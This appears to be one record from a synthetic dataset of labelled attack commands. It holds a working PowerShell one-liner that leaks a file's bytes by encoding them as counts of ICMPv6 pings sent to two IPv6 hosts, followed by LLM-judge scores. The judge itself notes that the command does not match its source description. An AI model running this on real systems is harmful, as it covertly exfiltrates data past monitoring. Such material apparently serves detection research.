@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Encodes nibbles into the number of ICMPv6 echos (-Count) sent to two destinations, a covert channel over ICMPv6 under T1011.",
+  "rationale_steps": [
+    "Derive high/low nibbles from each byte.",
+    "Transmit small bursts where the burst length encodes the nibble.",
+    "Space bursts with a short sleep to delineate values for the receiver."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-a32fe73c",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid separators, and correct Test-Connection parameters including -Count and -IPv6.",
+        "semantic_score": 5,
+        "semantic_justification": "Reads a file and encodes each byte\u2019s nibbles into ICMPv6 echo counts to two IPv6 destinations, creating a plausible ICMP-based covert channel (though unrelated to the provided system script proxy execution description).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T22:17:58.946445Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
